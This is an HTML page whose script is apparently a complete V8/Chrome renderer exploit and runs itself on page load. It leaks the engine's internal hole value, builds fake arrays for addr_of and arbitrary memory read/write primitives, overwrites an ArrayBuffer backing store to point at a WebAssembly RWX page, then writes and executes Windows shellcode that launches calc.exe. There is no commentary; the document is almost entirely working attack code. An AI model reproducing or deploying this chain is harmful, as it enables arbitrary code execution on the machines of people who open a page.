<script>
  const FIXED_ARRAY_HEADER_SIZE = 8n;
  
  var buf = new ArrayBuffer(16);
  var f64 = new Float64Array(buf);
  var u32 = new Uint32Array(buf);
  
  var dv = new DataView(buf);
  
  function f2i(val)
  {
  dv.setFloat64(0,val,true);
  return dv.getBigUint64(0,true);
  }
  
  function i2f(val)
  {
  dv.setBigUint64(0,BigInt(val),true);
  return dv.getFloat64(0,true);
  }
  
  function f2half(f)
  {
  f64[0] = f;
  let tmp = Array.from(u32);
  return tmp;
  }
  
  function half2f(val)
  {
  u32.set(val);
  return f64[0];
  }
  
  function p64f(high,low){
  dv.setUint32(0,high,true);
  dv.setUint32(4,low,true);
  return dv.getFloat64(0,true);
  }
  
  function ByteToBigIntArray(payload)
  {
  
  let sc = []
  let tmp = 0n;
  let lenInt = BigInt(Math.floor(payload.length/8))
  for (let i = 0n; i < lenInt; i += 1n) {
      tmp = 0n;
      for(let j=0n; j<8n; j++){
          tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
      }
      sc.push(tmp);
  }
  
  let len = payload.length%8;
  tmp = 0n;
  for(let i=0n; i<len; i++){
      tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
  }
  sc.push(tmp);
  return sc;
  }
  
  function hex(i){
  return "0x"+i.toString(16).padStart(16,"0");
  }
  
  
  var arr_buf = new ArrayBuffer(8);
  var f64_arr = new Float64Array(arr_buf);
  var b64_arr = new BigInt64Array(arr_buf);
  
  function ftoi(f) {
      f64_arr[0] = f;
      return b64_arr[0];
  }
  
  function itof(i) {
      b64_arr[0] = BigInt(i);
      return f64_arr[0];
  }
  
  function smi(i) {
      return i << 1n;
  }
  
  
  function gc_minor() { //scavenge
      for(let i = 0; i < 1000; i++) {
          new ArrayBuffer(0x10000);
      }
  }
  
  function gc_major() { //mark-sweep
      new ArrayBuffer(0x7fe00000);
  }
  
  
  function set_keyed_prop(arr, key, val) {
      arr[key] = val;
  }
  
  function leak_hole() {
      let store_mode = []; //STORE_AND_GROW_HANDLE_COW
  
      const IC_WARMUP_COUNT = 10;
      for(let i = 0; i < IC_WARMUP_COUNT; i++) {
          set_keyed_prop(arguments, "foo", 1);
      }
    
      set_keyed_prop(store_mode, 0, 1);
  
      set_keyed_prop(arguments, arguments.length, 1);
  
      let hole = arguments[arguments.length+1];
  
      return hole;
  }
  const the = {};
  var large_arr = new Array(0x10000);
  large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
  var fake_arr = null;
  var fake_arr_addr = null;
  var fake_arr_elements_addr = null;
  
  var packed_dbl_map = null;
  var packed_dbl_props = null;
  
  var packed_map = null;
  var packed_props = null;
  
  function leak_stuff(b) {
      if(b) {
          let index = Number(b ? the.hole : -1);
          index |= 0;
          index += 1;
         
          let arr1 = [1.1, 2.2, 3.3, 4.4];
          let arr2 = [0x1337, large_arr];
          
          let packed_double_map_and_props = arr1.at(index*4);
          let packed_double_elements_and_len = arr1.at(index*5);
          
          let packed_map_and_props = arr1.at(index*8);
          let packed_elements_and_len = arr1.at(index*9);
          
          let fixed_arr_map = arr1.at(index*6);
          
          let large_arr_addr = arr1.at(index*7);
  
          return [
              packed_double_map_and_props, packed_double_elements_and_len,
              packed_map_and_props, packed_elements_and_len, 
              fixed_arr_map, large_arr_addr, 
              arr1, arr2
          ];
      }
      return 0;
  }
  
  function weak_fake_obj(b, addr=1.1) {
      if(b) {
          let index = Number(b ? the.hole : -1);
          index |= 0;
          index += 1;
         
          let arr1 = [0x1337, {}]
          let arr2 = [addr, 2.2, 3.3, 4.4];
          
          let fake_obj = arr1.at(index*8);
          
          return [
              fake_obj,
              arr1, arr2
          ];
      }
      return 0;
  }
  
  function fake_obj(addr) {
      large_arr[0] = itof(packed_map | (packed_dbl_props << 32n));
      large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
      large_arr[3] = itof(addr | 1n);
      
      let result = fake_arr[0];
      
      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
      
      return result;
  }
  
  
  function addr_of(obj) {
      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
      large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
      
      fake_arr[0] = obj;
      let result = ftoi(large_arr[3]) & 0xFFFFFFFFn;
      
      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
      
      return result;
  }
  
  function v8_read64(addr) {
      addr -= FIXED_ARRAY_HEADER_SIZE;
      
      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
      large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
      
      let result = ftoi(fake_arr[0]);
      
      large_arr[1] = itof(0n | (smi(0n) << 32n)); 
  
      return result;    
  }
  
  function v8_write64(addr, val) {
      addr -= FIXED_ARRAY_HEADER_SIZE;
      
      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
      large_arr[1] = itof((addr | 1n) | (smi(1n) << 32n));
      
      fake_arr[0] = itof(val);
      
      large_arr[1] = itof(0n | (smi(0n) << 32n));   
  }
  
  function install_primitives() {
      
      for(let i = 0; i < 0x20; i++) {
          weak_fake_obj(true, 1.1);
      }
      for(let i = 0; i < 0x2000000; i++) {
          weak_fake_obj(false, 1.1);
      }
      
      for(let i = 0; i < 0x20; i++) {
          leak_stuff(true);
      }
      for(let i = 0; i < 0x2000000; i++) {
          leak_stuff(false);
      }
      try{
        gc_minor();
      gc_major();
      }catch(error){
        //alert(error.message);
      }
      
      
      let leaks = leak_stuff(true);
      //%DebugPrint(leaks);
      
      let packed_double_map_and_props = ftoi(leaks[0]);
      let packed_double_elements_and_len = ftoi(leaks[1]);
      packed_dbl_map = packed_double_map_and_props & 0xFFFFFFFFn;
      packed_dbl_props = packed_double_map_and_props >> 32n;
      let packed_dbl_elements = packed_double_elements_and_len & 0xFFFFFFFFn;
      
      let packed_map_and_props = ftoi(leaks[2]);
      let packed_elements_and_len = ftoi(leaks[3]);
      
      packed_map = packed_map_and_props & 0xFFFFFFFFn;
      packed_props = packed_map_and_props >> 32n;
      let packed_elements = packed_elements_and_len & 0xFFFFFFFFn;
      
      let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
      
      let large_arr_addr = ftoi(leaks[5]) >> 32n;
      
      let dbl_arr = leaks[6];
      dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
      dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
      
      let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE)|1n;
      
      // print("packed_dbl_map = " + packed_dbl_map.toString(16));
      // print("packed_dbl_props = " + packed_dbl_props.toString(16));
      // print("packed_dbl_elements = " + packed_dbl_elements.toString(16));
      // print("packed_map = " + packed_map.toString(16));
      // print("packed_props = " + packed_props.toString(16));
      // print("packed_elements = " + packed_elements.toString(16));
      // print("fixed_arr_map = " + fixed_arr_map.toString(16));
      // print("large_arr = " + large_arr_addr.toString(16));
      // print("[+] packed_map_and_props : 0x" + packed_map_and_props.toString());
      // print("[+] packed_elements_and_len : 0x" + packed_elements_and_len.toString());
      // %DebugPrint(leaks[7]);
      // %SystemBreak();
      //print("addr = " + ftoi(leaks[0]).toString(16));
      //print("addr = " + ftoi(leaks[1]).toString(16));
      //
      //print("addr = " + ftoi(leaks[2]).toString(16));
      //print("addr = " + ftoi(leaks[3]).toString(16));
      //
      //print("addr = " + ftoi(leaks[4]).toString(16));
      //print("addr = " + ftoi(leaks[5]).toString(16));
  
      let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
      let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
      fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
      fake_arr_elements_addr = fake_arr_addr + 16n;
      
      large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
      large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
      large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));
  
      fake_arr = weak_fake_obj(true, itof(fake_arr_addr))[0];
      
      temp_fake_arr = null;
  }
  
  //*/
  function pwn() {
  
    
      var buf1 = new ArrayBuffer(0x200);
      var dataview1 = new DataView(buf1);
  
      the.hole = leak_hole();
      alert(the.hole);
      install_primitives();
  
      
      let buf_addr = addr_of(buf1) & 0xffffffffn;;
      // alert("[+]buf_addr : " + hex(buf_addr));
      var backing_store = buf_addr+0x14n;
      // alert("[+]backing_store : " + hex(backing_store));
    
      var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,139,128,128,128,0,1,133,128,128,128,0,0,65,255,7,11]);
      // // var wasmCode1 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
  
      var wasmModule = new WebAssembly.Module(wasmCode);
      // // %SystemBreak();
      // // wasmModule = new WebAssembly.Module(wasmCode1)
      var wasmInstance = new WebAssembly.Instance(wasmModule, {});
      var f = wasmInstance.exports.main;
  
      let instance_addr = addr_of(wasmInstance);
      // // // %DebugPrint(buf1);
      // alert("[+]wasm instance addr : " + hex(instance_addr));
      let rwx_addr = v8_read64(instance_addr-1n+0x40n) & 0xffffffffn;
      
      v8_write64(backing_store,rwx_addr);
      var shellcode = [0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0x0c,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x08,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x01,0xc3,0x8b,0x5b,0x78,0x01,0xc3,0x8b,0x7b,0x20,0x01,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x01,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x01,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x03,0x7d,0xfc,0x66,0x83,0xc1,0x08,0xf3,0xa6,0x74,0x05,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x04,0x41,0x8b,0x04,0x82,0x03,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x08,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x01,0x65,0x73,0x73,0xc1,0xe9,0x08,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0];
      for(var i = 0; i < shellcode.length; i++) {
          dataview1.setUint8(i, shellcode[i], true);
      }
      // alert("[+]rwx addr : " + hex(rwx_addr));
      f();
  }
  pwn();
  </script>